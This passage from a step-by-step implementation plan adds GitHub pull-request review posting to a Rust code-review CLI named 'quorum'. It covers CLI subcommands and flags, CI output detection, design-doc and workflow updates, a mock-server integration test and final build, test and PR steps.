                        Some(finding.line_start)
                    } else {
                        None
                    },
                    start_side: if finding.line_start != finding.line_end {
                        Some("RIGHT".into())
                    } else {
                        None
                    },
                });
            }
            PostingTarget::Body => {
                body_findings.push(finding.clone());
            }
        }
    }

    let review_body = render_review_body(
        &marker,
        inline_comments.len(),
        &body_findings,
        &req.version,
    );

    let create_req = CreateReviewRequest {
        commit_id: req.commit_sha.clone(),
        event: "COMMENT".into(),
        body: review_body,
        comments: inline_comments,
    };

    let url = format!(
        "{}/repos/{}/{}/pulls/{}/reviews",
        GITHUB_API_BASE, req.owner, req.repo, req.pr_number
    );
    let headers = github_client_headers(&req.token);
    let resp = client
        .post(&url)
        .headers(headers)
        .json(&create_req)
        .send()
        .await?;

    if !resp.status().is_success() {
        return Err(GitHubReportError::Api {
            status: resp.status().as_u16(),
            message: resp.text().await.unwrap_or_default(),
        });
    }

    let review: ReviewResponse = resp.json().await?;

    Ok(PostReviewResult {
        review_id: review.id,
        inline_count: create_req.comments.len(),
        body_count: body_findings.len(),
        dismissed_previous,
    })
}
```

- [ ] **Step 3: Run clippy and fix any issues**

Run: `cargo clippy --bin quorum -- -D warnings 2>&1 | tail -20`

- [ ] **Step 4: Commit**

```bash
git add src/github_report.rs
git commit -m "feat(github): add post_review, dismiss, and diff fetch API calls (#313)"
```

---

### Task 7: CLI Integration — `Report` Subcommand

Wire up the `quorum report` subcommand.

**Files:**
- Modify: `src/cli/mod.rs`
- Modify: `src/main.rs`

- [ ] **Step 1: Add ReportOpts and Command variant**

In `src/cli/mod.rs`, add the `Report` variant to the `Command` enum (after `Calibrate`):

```rust
/// Post review findings as GitHub PR comments
Report(ReportOpts),
```

And add the struct (after `CalibrateOpts`):

```rust
#[derive(Parser)]
pub struct ReportOpts {
    /// JSON findings file path, or "-" for stdin
    pub findings_file: String,

    /// Pull request number
    #[arg(long)]
    pub pr: u64,

    /// GitHub personal access token (default: GITHUB_TOKEN env)
    #[arg(long, env = "GITHUB_TOKEN", hide_env_values = true)]
    pub github_token: Option<String>,

    /// Repository in owner/repo format (default: auto-detect)
    #[arg(long)]
    pub github_repo: Option<String>,

    /// Local diff file (default: fetch from PR API)
    #[arg(long)]
    pub diff_file: Option<PathBuf>,
}
```

- [ ] **Step 2: Add `run_report` handler in main.rs**

Add to the match in `main()`:

```rust
cli::Command::Report(opts) => {
    let exit_code = run_report(opts).await;
    std::process::exit(exit_code);
}
```

Implement `run_report`:

```rust
async fn run_report(opts: cli::ReportOpts) -> i32 {
    // Read findings from file or stdin
    let json_str = if opts.findings_file == "-" {
        use std::io::Read;
        let mut buf = String::new();
        if let Err(e) = std::io::stdin().read_to_string(&mut buf) {
            eprintln!("Error: failed to read stdin: {}", e);
            return 3;
        }
        buf
    } else {
        match std::fs::read_to_string(&opts.findings_file) {
            Ok(s) => s,
            Err(e) => {
                eprintln!("Error: failed to read {}: {}", opts.findings_file, e);
                return 3;
            }
        }
    };

    let findings: Vec<finding::Finding> = match serde_json::from_str(&json_str) {
        Ok(f) => f,
        Err(e) => {
            eprintln!("Error: failed to parse findings JSON: {}", e);
            return 3;
        }
    };

    // Resolve GitHub context
    let ctx = match github_report::resolve_github_context(
        opts.github_token.as_deref(),
        opts.github_repo.as_deref(),
    ) {
        Ok(c) => c,
        Err(e) => {
            eprintln!("Error: {}", e);
            return 3;
        }
    };

    let client = reqwest::Client::builder()
        .connect_timeout(std::time::Duration::from_secs(10))
        .timeout(std::time::Duration::from_secs(60))
        .build()
        .unwrap();

    // Get diff text
    let diff_text = if let Some(ref diff_path) = opts.diff_file {
        match std::fs::read_to_string(diff_path) {
            Ok(d) => d,
            Err(e) => {
                eprintln!("Error: failed to read diff file: {}", e);
                return 3;
            }
        }
    } else {
        match github_report::fetch_pr_diff(&client, &ctx.owner, &ctx.repo, opts.pr, &ctx.token).await {
            Ok(d) => d,
            Err(e) => {
                eprintln!("Error: failed to fetch PR diff: {}", e);
                return 3;
            }
        }
    };

    // Get commit SHA
    let commit_sha = match github_report::fetch_pr_head_sha(
        &client, &ctx.owner, &ctx.repo, opts.pr, &ctx.token,
    ).await {
        Ok(sha) => sha,
        Err(e) => {
            eprintln!("Error: failed to fetch PR head SHA: {}", e);
            return 3;
        }
    };

    let run_id = ulid::Ulid::new().to_string();
    let version = env!("CARGO_PKG_VERSION").to_string();

    let req = github_report::PostReviewRequest {
        owner: ctx.owner,
        repo: ctx.repo,
        pr_number: opts.pr,
        token: ctx.token,
        findings,
        diff_text,
        version,
        run_id,
        commit_sha,
    };

    eprint!("Posting {} findings to PR #{}...", req.findings.len(), req.pr_number);

    match github_report::post_review(&client, &req).await {
        Ok(result) => {
            if let Some(dismissed) = result.dismissed_previous {
                eprint!(" dismissed review {}...", dismissed);
            }
            eprintln!(" done ({} inline, {} in summary)", result.inline_count, result.body_count);
            0
        }
        Err(e) => {
            eprintln!("\nError: GitHub post failed: {}", e);
            3
        }
    }
}
```

- [ ] **Step 3: Verify compilation**

Run: `cargo build --bin quorum 2>&1 | tail -10`
Expected: compiles cleanly

- [ ] **Step 4: Verify help output**

Run: `cargo run -- report --help 2>&1`
Expected: shows ReportOpts flags

- [ ] **Step 5: Commit**

```bash
git add src/cli/mod.rs src/main.rs
git commit -m "feat(github): add quorum report subcommand (#313)"
```

---

### Task 8: CLI Integration — `--github-pr` on ReviewOpts

Wire up the convenience flag on `quorum review`.

**Files:**
- Modify: `src/cli/mod.rs` (ReviewOpts)
- Modify: `src/main.rs` (run_review tail)

- [ ] **Step 1: Add flags to ReviewOpts**

In `src/cli/mod.rs`, add to `ReviewOpts` (after `judge_model`):

```rust
/// Post findings as GitHub PR review comments
#[arg(long)]
pub github_pr: Option<u64>,

/// GitHub personal access token (default: GITHUB_TOKEN env)
#[arg(long, env = "GITHUB_TOKEN", hide_env_values = true)]
pub github_token: Option<String>,

/// Repository in owner/repo format (default: auto-detect)
#[arg(long)]
pub github_repo: Option<String>,
```

- [ ] **Step 2: Add post-review hook in run_review**

In `src/main.rs`, just before the final `output::compute_exit_code(&all_findings)` line at the end of `run_review` (~line 1874), insert:

```rust
    // Post to GitHub PR if --github-pr is set (non-fatal side-effect)
    if let Some(pr_number) = opts.github_pr {
        let review_exit = output::compute_exit_code(&all_findings);
        let ctx = match github_report::resolve_github_context(
            opts.github_token.as_deref(),
            opts.github_repo.as_deref(),
        ) {
            Ok(c) => c,
            Err(e) => {
                eprintln!("Error: GitHub post failed: {} (review exit code preserved: {})", e, review_exit);
                return review_exit;
            }
        };

        let client = reqwest::Client::builder()
            .connect_timeout(std::time::Duration::from_secs(10))
            .timeout(std::time::Duration::from_secs(60))
            .build()
            .unwrap();

        let diff_text = if let Some(ref diff_path) = opts.diff_file {
            std::fs::read_to_string(diff_path).unwrap_or_default()
        } else {
            github_report::fetch_pr_diff(&client, &ctx.owner, &ctx.repo, pr_number, &ctx.token)
                .await
                .unwrap_or_default()
        };

        let commit_sha = github_report::fetch_pr_head_sha(
            &client, &ctx.owner, &ctx.repo, pr_number, &ctx.token,
        )
        .await
        .unwrap_or_else(|_| "unknown".into());

        let run_id = ulid::Ulid::new().to_string();
        let version = env!("CARGO_PKG_VERSION").to_string();

        let req = github_report::PostReviewRequest {
            owner: ctx.owner,
            repo: ctx.repo,
            pr_number,
            token: ctx.token,
            findings: all_findings.clone(),
            diff_text,
            version,
            run_id,
            commit_sha,
        };

        eprint!("Posting {} findings to PR #{}...", req.findings.len(), pr_number);
        match github_report::post_review(&client, &req).await {
            Ok(result) => {
                if let Some(dismissed) = result.dismissed_previous {
                    eprint!(" dismissed review {}...", dismissed);
                }
                eprintln!(" done ({} inline, {} in summary)", result.inline_count, result.body_count);
            }
            Err(e) => {
                eprintln!(
                    "\nError: GitHub post failed: {} (review exit code preserved: {})",
                    e, review_exit
                );
            }
        }

        return review_exit;
    }
```

- [ ] **Step 3: Verify compilation**

Run: `cargo build --bin quorum 2>&1 | tail -10`

- [ ] **Step 4: Verify help output**

Run: `cargo run -- review --help 2>&1 | grep github`
Expected: shows `--github-pr`, `--github-token`, `--github-repo`

- [ ] **Step 5: Commit**

```bash
git add src/cli/mod.rs src/main.rs
git commit -m "feat(github): add --github-pr flag to quorum review (#313)"
```

---

### Task 9: CI Output Mode — `GITHUB_ACTIONS` Compact Detection

**Files:**
- Modify: `src/output/mod.rs:422-428`

- [ ] **Step 1: Write failing test**

In `src/output/mod.rs` tests:

```rust
#[test]
fn should_use_compact_github_actions() {
    std::env::set_var("GITHUB_ACTIONS", "true");
    assert!(should_use_compact(false));
    std::env::remove_var("GITHUB_ACTIONS");
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cargo test --bin quorum output::tests::should_use_compact_github_actions -- --nocapture 2>&1`
Expected: FAIL

- [ ] **Step 3: Add GITHUB_ACTIONS to should_use_compact**

In `src/output/mod.rs`, modify `should_use_compact` (~line 422):

```rust
pub fn should_use_compact(compact_flag: bool) -> bool {
    compact_flag
        || is_env_set("CLAUDE_CODE")
        || is_env_set("GEMINI_CLI")
        || is_env_set("CODEX_CI")
        || is_env_set("AGENT")
        || is_env_set("GITHUB_ACTIONS")
}
```

- [ ] **Step 4: Run test to verify it passes**

- [ ] **Step 5: Commit**

```bash
git add src/output/mod.rs
git commit -m "feat(github): detect GITHUB_ACTIONS for compact output mode (#313)"
```

---

### Task 10: DESIGN.md and Workflow YAML

**Files:**
- Modify: `DESIGN.md`
- Create: `.github/workflows/quorum-review-analyze.yml`
- Create: `.github/workflows/quorum-review-report.yml`

- [ ] **Step 1: Update DESIGN.md Section 2**

Add `GITHUB_ACTIONS` to the compact detection list and detection logic. In the env vars list (~line 418-428 equivalent in DESIGN.md), add the bullet:

```markdown
- GITHUB_ACTIONS: GitHub Actions CI
```

And update the detection logic block:

```
if --json flag OR !stdout.is_terminal() -> JSON
else if --compact or CLAUDE_CODE or GITHUB_ACTIONS env -> Compact
else                                                    -> Human
```

- [ ] **Step 2: Add DESIGN.md Section 14: GitHub PR Comments**

Add at the end of DESIGN.md before `## 13. Anti-patterns`:

```markdown
## 14. GitHub PR Comments

When posting findings as GitHub PR review comments (`quorum report` or
`quorum review --github-pr`), output uses GitHub-flavored Markdown
consistent with the terminal format:

### Inline comment (one per finding, on the diff line)

    **!** Finding title — `category`

    Description text with suggested fix.

    *quorum 0.27.0 | model-name, source*

### Review body

    <!-- quorum-review-marker:v1 run_id=... sha=... version=... -->

    ## Quorum Review

    N findings (M critical, K warning, J info) | X inline, Y in summary

    ### Findings outside changed lines

    **~** Title — `category` L42

    Description.

    *quorum 0.27.0 | source*

### Sanitization

Always-on for PR comment bodies. Strips control characters, neutralizes
@mentions and #refs (rendered as inline code), removes image/anchor HTML
tags, escapes backtick runs of 3+, and truncates at 60,000 chars.

### Re-run behavior

Each review includes a `quorum-review-marker` HTML comment. On re-run,
previous quorum reviews are dismissed (best-effort) before the new review
is posted.
```

- [ ] **Step 3: Create Stage 1 workflow**

Write `.github/workflows/quorum-review-analyze.yml` with the content from the design spec (Stage 1 section).

- [ ] **Step 4: Create Stage 2 workflow**

Write `.github/workflows/quorum-review-report.yml` with the content from the design spec (Stage 2 section).

- [ ] **Step 5: Commit**

```bash
git add DESIGN.md .github/workflows/quorum-review-analyze.yml .github/workflows/quorum-review-report.yml
git commit -m "docs: update DESIGN.md and add CI workflows for PR review (#313)"
```

---

### Task 11: Version Bump and CLAUDE.md Update

**Files:**
- Modify: `Cargo.toml` (version)
- Modify: `CLAUDE.md` (add `report` command and `--github-pr` flag)

- [ ] **Step 1: Bump version to 0.27.0**

In `Cargo.toml`, change `version = "0.26.0"` to `version = "0.27.0"`.

- [ ] **Step 2: Update CLAUDE.md commands section**

Add to the commands list:

```markdown
cargo run -- report findings.json --pr 42     # post findings to GitHub PR
cargo run -- review src/*.rs --github-pr 42   # review + post to PR in one step
```

Add to environment section:

```markdown
GITHUB_TOKEN=ghp_...                           # GitHub API token for PR comments
```

- [ ] **Step 3: Run full test suite**

Run: `cargo test --bin quorum 2>&1 | tail -5`
Expected: all tests pass

- [ ] **Step 4: Run clippy**

Run: `cargo clippy --bin quorum -- -D warnings 2>&1 | tail -5`
Expected: no warnings

- [ ] **Step 5: Commit**

```bash
git add Cargo.toml CLAUDE.md
git commit -m "chore: bump version to 0.27.0 and update CLAUDE.md (#313)"
```

---

### Task 12: Integration Test with Mock HTTP Server

End-to-end test of the `post_review` flow against a mock server.

**Files:**
- Modify: `src/github_report.rs` (make GITHUB_API_BASE configurable for tests)

- [ ] **Step 1: Make API base URL injectable for testing**

Add a `base_url` field to `PostReviewRequest`:

```rust
pub struct PostReviewRequest {
    // ... existing fields ...
    /// Override API base URL (default: https://api.github.com). For testing.
    pub api_base_url: Option<String>,
}
```

Update all URL constructions in the API functions to use `req.api_base_url.as_deref().unwrap_or(GITHUB_API_BASE)`.

- [ ] **Step 2: Write integration test**

```rust
#[cfg(test)]
mod integration_tests {
    use super::*;
    use std::net::TcpListener;

    #[tokio::test]
    async fn post_review_creates_review_with_inline_comments() {
        // Start a minimal mock server
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let port = listener.local_addr().unwrap().port();
        let base_url = format!("http://127.0.0.1:{}", port);

        // Spawn mock handler in background
        let handle = tokio::spawn(async move {
            // Accept and respond to: list reviews, create review
            for _ in 0..2 {
                let (mut stream, _) = listener.accept().unwrap();
                use std::io::{Read, Write};
                let mut buf = [0u8; 4096];
                let n = stream.read(&mut buf).unwrap();
                let req_str = String::from_utf8_lossy(&buf[..n]);

                if req_str.contains("GET") {
                    // List reviews — return empty
                    let body = "[]";
                    let resp = format!(
                        "HTTP/1.1 200 OK\r\nContent-Length: {}\r\n\r\n{}",
                        body.len(), body
                    );
                    stream.write_all(resp.as_bytes()).unwrap();
                } else {
                    // Create review — return id
                    let body = r#"{"id": 42}"#;
                    let resp = format!(
                        "HTTP/1.1 200 OK\r\nContent-Length: {}\r\n\r\n{}",
                        body.len(), body
                    );
                    stream.write_all(resp.as_bytes()).unwrap();
                }
            }
        });

        let diff = "--- a/src/auth.rs\n+++ b/src/auth.rs\n@@ -40,3 +40,5 @@\n context\n+added\n+added\n context\n";
        let f = make_finding("f1", 41, true);
        let client = reqwest::Client::new();

        let req = PostReviewRequest {
            owner: "test".into(),
            repo: "repo".into(),
            pr_number: 1,
            token: "fake-token".into(),
            findings: vec![f],
            diff_text: diff.into(),
            version: "0.27.0".into(),
            run_id: "01TEST".into(),
            commit_sha: "abc123".into(),
            api_base_url: Some(base_url),
        };

        let result = post_review(&client, &req).await.unwrap();
        assert_eq!(result.review_id, 42);
        assert_eq!(result.inline_count, 1);
        assert_eq!(result.body_count, 0);

        handle.abort();
    }
}
```

- [ ] **Step 3: Run integration test**

Run: `cargo test --bin quorum github_report::integration_tests -- --nocapture 2>&1 | tail -10`
Expected: PASS

- [ ] **Step 4: Commit**

```bash
git add src/github_report.rs
git commit -m "test(github): add integration test with mock HTTP server (#313)"
```

---

### Task 13: Final Verification

- [ ] **Step 1: Run full test suite**

Run: `cargo test --bin quorum 2>&1 | tail -10`
Expected: all tests pass (including all new github_report tests)

- [ ] **Step 2: Run clippy**

Run: `cargo clippy --bin quorum -- -D warnings 2>&1 | tail -10`
Expected: clean

- [ ] **Step 3: Run rustfmt**

Run: `cargo fmt --all -- --check 2>&1`
Expected: no formatting issues

- [ ] **Step 4: Test CLI help**

Run: `cargo run -- report --help 2>&1` and `cargo run -- review --help 2>&1 | grep github`
Expected: both show the expected flags

- [ ] **Step 5: Push branch and open PR**

```bash
git push -u origin feat/github-pr-comments
gh pr create --title "feat: native GitHub PR comment support (#313)" \
  --body "$(cat <<'EOF'
## Summary
- Add `quorum report` subcommand for posting findings to GitHub PRs
- Add `--github-pr` convenience flag on `quorum review`
- Two-stage workflow_run CI pattern for fork safety
- Always-on output sanitization for PR comment bodies
- Dismiss-and-replace protocol for re-runs

## Test plan
- [ ] Unit tests for sanitize_for_github (12 cases)
- [ ] Unit tests for Markdown rendering (5 cases)
- [ ] Unit tests for commentability validation (4 cases)
- [ ] Unit tests for repo URL parsing (6 cases)
- [ ] Unit tests for marker protocol (4 cases)
- [ ] Integration test with mock HTTP server
- [ ] CI compact mode detection test
- [ ] Manual test: `quorum review --json > /tmp/f.json && quorum report /tmp/f.json --pr <N>`

🤖 Generated with [Claude Code](https://claude.com/claude-code)
EOF
)"
```
